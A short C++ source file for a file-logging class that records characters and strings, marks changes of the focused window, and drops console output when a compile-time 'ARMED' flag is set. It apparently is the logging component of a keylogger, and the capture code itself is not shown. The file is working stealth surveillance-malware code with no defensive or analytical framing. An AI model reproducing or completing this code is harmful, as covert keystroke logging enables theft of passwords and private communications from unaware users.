#include "pch.h"
#include "file.h"

bool logFILE::log(const wchar_t& c) {
	if (!m_working) return false;
	logwindow();
	if constexpr (!ARMED) std::wcout << c;
	m_file << c;
	flush();
	return true;
}

bool logFILE::log(const std::wstring& str) {
	if (!m_working) return false;
	logwindow();
	if constexpr (!ARMED) std::wcout << str;
	m_file << str;
	flush();
	return true;
}

void logFILE::flush() {
	static short counter = 0;
	if (counter < FLUSH_FREQUENCY) counter++;
	else {
		if constexpr (!ARMED) std::wcout << L"[flushing]";
		m_file.flush();
		counter = 0;
	}
}

void logFILE::logwindow() {
	if (m_working && updateFocusedWindow()) {
		std::wstring tolog = L"\n[window changed]\t";
		if constexpr (!ARMED) std::wcout << tolog;
		m_file << tolog;
	}
}

logFILE::logFILE(const std::string& fname) {
	m_fname = fname;
	m_file.open(m_fname, std::fstream::app);
	m_file.imbue(std::locale("de-DE"));
	m_working = m_file.is_open();
}
